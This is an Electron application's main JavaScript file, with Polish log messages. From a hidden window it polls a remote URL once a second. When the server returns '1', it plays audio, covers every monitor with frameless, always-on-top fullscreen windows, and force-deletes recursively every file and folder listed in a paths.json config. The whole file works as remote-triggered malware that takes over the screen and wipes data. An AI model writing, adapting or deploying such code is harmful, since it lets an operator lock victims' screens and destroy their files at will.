const { app, BrowserWindow, screen } = require("electron");
const path = require("path");
const fs = require("fs");
const fetch = require("node-fetch");

app.commandLine.appendSwitch("autoplay-policy", "no-user-gesture-required");

let hiddenWindow;
let windows = [];
let windowsOpened = false;

function deletePaths() {
  const configPath = path.join(__dirname, "paths.json");

  if (!fs.existsSync(configPath)) {
    console.warn("Brak pliku paths.json, pomijam usuwanie");
    return;
  }

  const config = JSON.parse(fs.readFileSync(configPath, "utf-8"));
  if (!config.delete || !Array.isArray(config.delete)) {
    console.warn("Nieprawidłowa struktura paths.json");
    return;
  }

  config.delete.forEach((p) => {
    try {
      if (fs.existsSync(p)) {
        const stat = fs.lstatSync(p);
        if (stat.isDirectory()) {
          fs.rmSync(p, { recursive: true, force: true });
        } else {
          fs.unlinkSync(p);
        }
      } else {
        console.log(`Path doesn't exists: ${p}`);
      }
    } catch (err) {
      console.error(err);
    }
  });
}

app.whenReady().then(() => {
  hiddenWindow = new BrowserWindow({
    show: false,
    webPreferences: {
      preload: path.join(__dirname, "app", "preload-hidden.js"),
      contextIsolation: true,
      nodeIntegration: false,
    },
  });
  hiddenWindow.loadFile("app/hidden.html");

  const interval = setInterval(() => {
    fetch("http://website.com/check.php")
      .then((res) => res.text())
      .then((data) => {
        if (data.trim() === "1" && !windowsOpened) {
          windowsOpened = true;

          hiddenWindow.webContents.send("play-sound");

          const displays = screen.getAllDisplays();
          displays.forEach((display) => {
            const win = new BrowserWindow({
              x: display.bounds.x,
              y: display.bounds.y,
              width: display.bounds.width,
              height: display.bounds.height,
              fullscreen: true,
              frame: false,
              autoHideMenuBar: true,
              alwaysOnTop: true,
              focusable: true,
              webPreferences: {
                nodeIntegration: true,
                contextIsolation: false,
              },
            });
            win.loadFile("app/index.html");

            win.setAlwaysOnTop(true, "screen-saver");
            win.focus();

            win.on("closed", () => {
              windows = windows.filter((w) => w !== win);
            });
            windows.push(win);
          });

          deletePaths();

          clearInterval(interval);
        }
      })
      .catch((err) => console.error("Błąd fetch:", err));
  }, 1000);
});

app.on("window-all-closed", () => {
  if (process.platform !== "darwin") app.quit();
});
